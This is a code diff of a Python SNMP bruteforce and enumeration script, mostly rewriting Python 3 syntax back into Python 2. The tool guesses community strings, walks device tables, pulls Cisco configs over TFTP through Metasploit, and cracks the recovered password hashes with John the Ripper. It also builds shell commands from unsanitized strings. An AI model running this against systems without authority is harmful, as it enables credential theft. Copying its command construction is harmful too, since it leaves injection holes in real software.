@@ -9,18 +9,19 @@
 # SNMP Bruteforce & Enumeration Script
 # http://www.secforce.com / nikos.vassakis <at> secforce.com
 # ##########################################################
-__version__ = 'v2.0'
+__version__ = 'v1.0b'
 
 from socket import socket, SOCK_DGRAM, AF_INET, timeout
 from random import randint
 from time import sleep
 import optparse, sys, os
 from subprocess import Popen, PIPE
-import threading
-import signal
+import struct
+import threading, thread
+import tempfile
+
 from scapy.all import (SNMP, SNMPnext, SNMPvarbind, ASN1_OID, SNMPget, ASN1_DECODING_ERROR, ASN1_NULL, ASN1_IPADDRESS,
                        SNMPset, SNMPbulk, IP)
-
 
 ##########################################################################################################
 #	Defaults
@@ -220,7 +221,7 @@ class SNMPResults:
 	write=False
 
 	def __eq__(self, other):
-		return self.addr == other.addr and self.version == other.version and self.community == other.community.decode("utf-8")
+		return self.addr == other.addr and self.version == other.version and self.community == other.community
 
 ##########################################################################################################
 #	Colour output functions
@@ -251,7 +252,7 @@ def printout(text, colour=WHITE):
 			sys.stdout.write(seq)
 	else:
 			#sys.stdout.write(text)
-			print(text)
+			print text
 
 
 ##########################################################################################################
@@ -260,16 +261,16 @@ def printout(text, colour=WHITE):
 
 def banner(art=True):
 	if art:
-		print( "   _____ _   ____  _______     ____             __     ",file=sys.stderr)
-		print( "  / ___// | / /  |/  / __ \\   / __ )_______  __/ /____ ",file=sys.stderr)
-		print( "  \\__ \\/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \\",file=sys.stderr)
-		print( " ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/",file=sys.stderr)
-		print( "/____/_/ |_/_/  /_/_/      /_____/_/   \\__,_/\\__/\\___/ ",file=sys.stderr)
-		print( "",file=sys.stderr)
-		print( "SNMP Bruteforce & Enumeration Script " + __version__,file=sys.stderr)
-		print( "http://www.secforce.com / nikos.vassakis <at> secforce.com",file=sys.stderr)
-		print("###############################################################",file=sys.stderr)
-		print( "",file=sys.stderr)
+		print >> sys.stderr,  "   _____ _   ____  _______     ____             __     "
+		print >> sys.stderr,  "  / ___// | / /  |/  / __ \\   / __ )_______  __/ /____ "
+		print >> sys.stderr,  "  \\__ \\/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \\"
+		print >> sys.stderr,  " ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/"
+		print >> sys.stderr,  "/____/_/ |_/_/  /_/_/      /_____/_/   \\__,_/\\__/\\___/ "
+		print >> sys.stderr,  ""
+		print >> sys.stderr,  "SNMP Bruteforce & Enumeration Script " + __version__
+		print >> sys.stderr,  "http://www.secforce.com / nikos.vassakis <at> secforce.com"
+		print >> sys.stderr, "###############################################################"
+		print >> sys.stderr,  ""
 
 def listener(sock,results):
 	while True:
@@ -286,8 +287,7 @@ def listener(sock,results):
 		r.version=SNMPVersion.sversion(response.version.val)
 		r.community=response.community.val
 		results.append(r)
-		printout (('%s : %s \tVersion (%s):\t%s' % (str(addr[0]),str(addr[1]), SNMPVersion.sversion(response.version.val),response.community.val.decode("utf-8"))),WHITE)
-
+		printout (('%s : %s \tVersion (%s):\t%s' % (str(addr[0]),str(addr[1]), SNMPVersion.sversion(response.version.val),response.community.val)),WHITE)
 
 def SNMPrecv(sock):
 	try:
@@ -303,7 +303,7 @@ def SNMPsend(sock, packets, ip, port=defaults.port, community='', rate=defaults.
 		i = randint(0, 2147483647)
 		packet.PDU.id = i
 		packet.community = community
-		sock.sendto(bytes(packet), addr)
+		sock.sendto(str(packet), addr)
 		sleep(1/rate)
 
 def SNMPRequest(result,OID, value='', TimeOut=defaults.timeOut):
@@ -324,7 +324,7 @@ def SNMPRequest(result,OID, value='', TimeOut=defaults.timeOut):
 			PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID(OID))])
 			)
 
-	SNMPsend(s,p,r.addr[0],r.addr[1],r.community.decode("utf-8"))
+	SNMPsend(s,p,r.addr[0],r.addr[1],r.community)
 	for x in range(0, 5):
 		try:
 			response,addr=SNMPrecv(s)
@@ -357,18 +357,18 @@ def testSNMPWrite(results,options,OID='.1.3.6.1.2.1.1.4.0'):
 						SNMPRequest(r,OID,originalval)
 					except timeout:
 						pass
-					if options.verbose: printout (('\t %s (%s) (RW)' % (r.community.decode("utf-8"),r.version)),GREEN)
+					if options.verbose: printout (('\t %s (%s) (RW)' % (r.community,r.version)),GREEN)
 					curval=SNMPRequest(r,OID)[SNMPvarbind].value.val
 					if curval != originalval:
 						printout(('Couldn\'t restore value to: %s (OID: %s)' % (str(originalval),str(OID))),RED)
 				else:
-					if options.verbose: printout (('\t %s (%s) (R)' % (r.community.decode("utf-8"),r.version)),BLUE)
+					if options.verbose: printout (('\t %s (%s) (R)' % (r.community,r.version)),BLUE)
 			else:
 				r.write=None
-				printout (('\t %s (%s) (Failed)' % (r.community.decode("utf-8"),r.version)),RED)
+				printout (('\t %s (%s) (Failed)' % (r.community,r.version)),RED)
 		except timeout:
 			r.write=None
-			printout (('\t %s (%s) (Failed!)' % (r.community.decode("utf-8"),r.version)),RED)
+			printout (('\t %s (%s) (Failed!)' % (r.community,r.version)),RED)
 			continue
 
 def generic_snmpwalk(snmpwalk_args,oids):
@@ -378,18 +378,18 @@ def generic_snmpwalk(snmpwalk_args,oids):
 			entry={}
 			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2').readlines()
 
-			print('\tINFO')
-			print('\t----\t')
+			print '\tINFO'
+			print '\t----\t'
 			for i in out:
-				print('\t',i.strip())
-			print('\n')
+				print '\t',i.strip()
+			print '\n'
 		except KeyboardInterrupt:
 			pass
 
 def enumerateSNMPWalk(result,options):
 	r=result
 
-	snmpwalk_args=' -c "'+r.community.decode("utf-8")+'" -'+r.version+' '+str(r.addr[0])+':'+str(r.addr[1])
+	snmpwalk_args=' -c "'+r.community+'" -'+r.version+' '+str(r.addr[0])+':'+str(r.addr[1])
 
 	############################################################### 	Enumerate OS
 	if options.windows:
@@ -410,14 +410,14 @@ def enumerateSNMPWalk(result,options):
 	printout('################## Enumerating Routing Table (snmpwalk)',YELLOW)
 	try:
 		for key, val in RouteOIDS.items():	#Enumerate Routes
-			#print('\t *',val[1], val[0])
+			#print '\t *',val[1], val[0]
 			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+'| awk \'{print $NF}\' 2>&1').readlines()
 
 			entry[val[1]]=out
 
 
-		print('\tDestination\t\tNext Hop\tMask\t\t\tMetric\tInterface\tType\tProtocol\tAge')
-		print('\t-----------\t\t--------\t----\t\t\t------\t---------\t----\t--------\t---')
+		print '\tDestination\t\tNext Hop\tMask\t\t\tMetric\tInterface\tType\tProtocol\tAge'
+		print '\t-----------\t\t--------\t----\t\t\t------\t---------\t----\t--------\t---'
 		for j in range(lines):
 			print( '\t'+entry['Destination'][j].strip().ljust(12,' ') +
 					'\t\t'+entry['Next Hop'][j].strip().ljust(12,' ') +
@@ -432,28 +432,28 @@ def enumerateSNMPWalk(result,options):
 		pass
 
 	############################################################### 	Enumerate Arp
-	print('\n')
+	print '\n'
 	for key, val in ARPOIDS.items():
 		try:
 			printout(('################## Enumerating ARP Table using: %s (%s)'%(val[0],val[1])),YELLOW)
 			entry={}
 			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2 | cut -d\':\' -f 2').readlines()
 
-			lines=len(out)//3
+			lines=len(out)/3
 
 			entry['V']=out[0*lines:1*lines]
 			entry['MAC']=out[1*lines:2*lines]
 			entry['IP']=out[2*lines:3*lines]
 
 
-			print('\tIP\t\tMAC\t\t\tV')
-			print('\t--\t\t---\t\t\t--')
+			print '\tIP\t\tMAC\t\t\tV'
+			print '\t--\t\t---\t\t\t--'
 			for j in range(lines):
 				print(	'\t'+entry['IP'][j].strip().ljust(12,' ') +
 						'\t'+entry['MAC'][j].strip().ljust(18,' ') +
 						'\t'+entry['V'][j].strip().ljust(2,' ')
 				)
-			print('\n')
+			print '\n'
 		except KeyboardInterrupt:
 			pass
 
@@ -464,11 +464,11 @@ def enumerateSNMPWalk(result,options):
 			entry={}
 			out=os.popen('snmpwalk'+snmpwalk_args+' '+val[0]+' '+' | cut -d\'=\' -f 2').readlines()
 
-			print('\tINFO')
-			print('\t----\t')
+			print '\tINFO'
+			print '\t----\t'
 			for i in out:
-				print('\t',i.strip())
-			print('\n')
+				print '\t',i.strip()
+			print '\n'
 		except KeyboardInterrupt:
 			pass
 	############################################################### 	Enumerate Interfaces
@@ -478,48 +478,49 @@ def enumerateSNMPWalk(result,options):
 			out=os.popen('snmpnetstat'+snmpwalk_args+' '+val[0]).readlines()
 
 			for i in out:
-				print('\t',i.strip())
-			print('\n')
+				print '\t',i.strip()
+			print '\n'
 		except KeyboardInterrupt:
 			pass
 
 def get_cisco_config(result,options):
-	printout(('################## Trying to get config with: %s'% result.community.decode("utf-8")),YELLOW)
+	printout(('################## Trying to get config with: %s'% result.community),YELLOW)
 
 	identified_ip=os.popen('ifconfig eth0 |grep "inet addr:" |cut -d ":" -f 2 |awk \'{ print $1 }\'').read()
 
 	if options.interactive:
-		Local_ip = input('Enter Local IP ['+str(identified_ip).strip()+']:') or identified_ip.strip()
+		Local_ip = raw_input('Enter Local IP ['+str(identified_ip).strip()+']:') or identified_ip.strip()
 	else:
 		Local_ip = identified_ip.strip()
 
 	if not (os.path.isdir("./output")):
 		os.popen('mkdir output')
 
-	p=Popen('msfconsole -x "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS '+str(result.addr[0])+'; set LHOST '+str(Local_ip)+'; set COMMUNITY '+result.community.decode("utf-8")+'; set OUTPUTDIR ./output; set RETRIES 1; set RPORT '+str(result.addr[1])+'; set THREADS 5; set VERSION '+result.version.replace('v','')+'; run; exit -y" ',shell=True,stdin=PIPE,stdout=PIPE, stderr=PIPE) #>/dev/null 2>&1
+	p=Popen('msfconsole -x "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS '+str(result.addr[0])+'; set LHOST '+str(Local_ip)+'; set COMMUNITY '+result.community+'; set OUTPUTDIR ./output; set RETRIES 1; set RPORT '+str(result.addr[1])+'; set THREADS 5; set VERSION '+result.version.replace('v','')+'; run; exit -y" ',shell=True,stdin=PIPE,stdout=PIPE, stderr=PIPE) #>/dev/null 2>&1
 
 
-	print('msfconsole -x "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS '+str(result.addr[0])+'; set LHOST '+str(Local_ip)+'; set COMMUNITY '+result.community.decode("utf-8")+'; set OUTPUTDIR ./output; set RETRIES 1; set RPORT '+str(result.addr[1])+'; set THREADS 5; set VERSION '+result.version.replace('v','')+'; run; exit -y" ')
+	print 'msfconsole -x "use auxiliary/scanner/snmp/cisco_config_tftp; set RHOSTS '+str(result.addr[0])+'; set LHOST '+str(Local_ip)+'; set COMMUNITY '+result.community+'; set OUTPUTDIR ./output; set RETRIES 1; set RPORT '+str(result.addr[1])+'; set THREADS 5; set VERSION '+result.version.replace('v','')+'; run; exit -y" '
 
 	out=[]
 	while p.poll() is None:
 		line=p.stdout.readline()
-		out.append(line.decode("utf-8"))
-		print(line.decode("utf-8").replace('\n',''))
+		out.append(line)
+		print '\t',line.strip()
+
 	printout('################## Passwords Found:',YELLOW)
 	encrypted=[]
 	for i in out:
 		if "Password" in i:
-			print('\t',i.strip())
+			print '\t',i.strip()
 		if "Encrypted" in i:
 			encrypted.append(i.split()[-1])
 
 	if encrypted:
-		print('\nCrack encrypted password(s)?')
+		print '\nCrack encrypted password(s)?'
 		for i in encrypted:
-			print('\t',i)
+			print '\t',i
 
-		#if (False if input("(Y/n):").lower() == 'n' else True):
+		#if (False if raw_input("(Y/n):").lower() == 'n' else True):
 		if not get_input("(Y/n):",'n',options):
 
 			with open('./hashes', 'a') as f:
@@ -528,17 +529,17 @@ def get_cisco_config(result,options):
 
 			p=Popen('john ./hashes',shell=True,stdin=PIPE,stdout=PIPE,stderr=PIPE)
 			while p.poll() is None:
-					print('\t',p.stdout.readline())
-			print('Passwords Cracked:')
+					print '\t',p.stdout.readline()
+			print 'Passwords Cracked:'
 			out=os.popen('john ./hashes --show').readlines()
 			for i in out:
-				print('\t', i.strip())
+				print '\t', i.strip()
 
 	out=[]
 	while p.poll() is None:
 		line=p.stdout.readline()
 		out.append(line)
-		print('\t',line.strip())
+		print '\t',line.strip()
 
 def select_community(results,options):
 	default=None
@@ -547,12 +548,12 @@ def select_community(results,options):
 
 		for l,r in enumerate(results):
 			if r.write==True:
-				printout ('\t%s) %s %s (%s)(RW)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community.decode("utf-8")),str(r.version)),GREEN)
+				printout ('\t%s) %s %s (%s)(RW)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community),str(r.version)),GREEN)
 				default=l
 			elif r.write==False:
-				printout ('\t%s) %s %s (%s)(RO)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community.decode("utf-8")),str(r.version)),BLUE)
+				printout ('\t%s) %s %s (%s)(RO)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community),str(r.version)),BLUE)
 			else:
-				printout ('\t%s) %s %s (%s)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community.decode("utf-8")),str(r.version)),RED)
+				printout ('\t%s) %s %s (%s)'%(l,str(r.addr[0]).ljust(15,' '),str(r.community),str(r.version)),RED)
 
 			if default is None:
 				default = l
@@ -561,7 +562,7 @@ def select_community(results,options):
 			return
 
 		if options.interactive:
-			selection=input("Select Community to Enumerate ["+str(default)+"]:")
+			selection=raw_input("Select Community to Enumerate ["+str(default)+"]:")
 			if not selection:
 				selection=default
 		else:
@@ -577,7 +578,7 @@ def select_community(results,options):
 def SNMPenumeration(result,options):
 	getcisco=defaults.getcisco
 	try:
-		printout (("\nEnumerating with READ-WRITE Community string: %s (%s)" % (result.community.decode("utf-8"),result.version)),YELLOW)
+		printout (("\nEnumerating with READ-WRITE Community string: %s (%s)" % (result.community,result.version)),YELLOW)
 		enumerateSNMPWalk(result,options)
 
 		if options.windows or options.linux:
@@ -586,7 +587,7 @@ def SNMPenumeration(result,options):
 		if getcisco:
 			get_cisco_config(result,options)
 	except KeyboardInterrupt:
-		print('\n')
+		print '\n'
 		return
 
 def password_brutefore(options, communities, ips):
@@ -623,7 +624,7 @@ def password_brutefore(options, communities, ips):
 		while True:
 			try:
 				try:
-					community=input().strip('\n')
+					community=raw_input().strip('\n')
 					for ip in ips:
 						SNMPsend(s, packets, ip, options.port, community, options.rate)
 				except EOFError:
@@ -632,10 +633,11 @@ def password_brutefore(options, communities, ips):
 				break
 
 	try:
-		print("Waiting for late packets (CTRL+C to stop)")
+		print "Waiting for late packets (CTRL+C to stop)"
 		sleep(options.timeOut+options.delay)	#Waiting in case of late response
 	except KeyboardInterrupt:
 		pass
+	T._Thread__stop()
 	s.close
 
 	#We remove any duplicates. This relies on the __equal__
@@ -646,15 +648,15 @@ def password_brutefore(options, communities, ips):
 	return newlist
 
 def get_input(string,non_default_option,options):
-	#(True if input("Enumerate with different community? (Y/n):").lower() == 'n' else False)
+	#(True if raw_input("Enumerate with different community? (Y/n):").lower() == 'n' else False)
 
 	if options.interactive:
-		if input(string).lower() == non_default_option:
+		if raw_input(string).lower() == non_default_option:
 			return True
 		else:
 			return False
 	else:
-		print(string)
+		print string
 		return False
 
 def main():
@@ -715,7 +717,7 @@ def main():
 				with open(options.lfile) as t:
 					ips = t.read().splitlines()	#Potential DoS
 			except:
-				print("Could not open targets file: " + options.lfile)
+				print "Could not open targets file: " + options.lfile
 				exit(0)
 		else:
 			ips.append(options.ip)
@@ -746,9 +748,9 @@ def main():
 	results=[]
 
 	if options.stdin:
-		print("Reading input for community strings ...", file=sys.stderr)
+		print >> sys.stderr, "Reading input for community strings ..."
 	else:
-		print("Trying {} community strings ...".format(communities),file=sys.stderr)
+		print >> sys.stderr, "Trying %d community strings ..." % len(communities)
 
 	if options.sploitego: #sploitego method of bruteforce
 		if ips:
@@ -762,7 +764,7 @@ def main():
 						r.version=version
 						r.community=i
 						results.append(r)
-					print(ip, version+'\t',result)
+					print ip, version+'\t',result
 		else:
 			parser.print_help()
 
@@ -781,7 +783,7 @@ def main():
 	while options.enum:
 		SNMPenumeration(select_community(results,options),options)
 
-		#if (True if input("Enumerate with different community? (Y/n):").lower() == 'n' else False):
+		#if (True if raw_input("Enumerate with different community? (Y/n):").lower() == 'n' else False):
 		if get_input("Enumerate with different community? (y/N):",'y',options):
 			continue
 		else:
@@ -790,7 +792,7 @@ def main():
 	if not options.enum:
 		select_community(results,options)
 
-		print("Finished!")
+		print "Finished!"
 
 if __name__ == "__main__":
 	main()
